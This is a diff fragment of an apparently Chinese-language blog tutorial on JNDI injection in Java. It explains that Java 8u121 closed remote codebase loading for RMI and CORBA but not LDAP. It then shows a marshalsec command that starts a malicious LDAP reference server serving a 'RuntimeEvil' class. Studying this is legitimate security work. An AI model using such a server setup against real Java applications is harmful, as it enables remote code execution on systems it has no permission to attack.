@@ -777,7 +777,7 @@
 <li>8u121修复</li>
 </ul>
 <p>jdni在8u121后，在加载factoryLocation时，对远程codebase不再信赖，默认trustURLCodebase为false。</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925180637512.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925180637512.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240925180637512">不过只加了RMI和CORBA的，LDAP依旧能打</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925180637512.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240925180637512.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240925180637512">不过只加了RMI和CORBA的，LDAP依旧能打，详情自己去LDAPctx文件跟</p>
 <p>如果你要用ldap服务打，相应的就要改RMIServer为LDAPServer：</p>
 <p>直接抄一个，因为LDAP服务不是java特有的，其他语言也在用的一个轻型目录访问协议（Lightweight Directory Access Protocol），图方便可以用marshalsec起</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:<span class="comment">//127.0.0.1:8888/#RuntimeEvil 1099</span></span><br></pre></td></tr></table></figure>
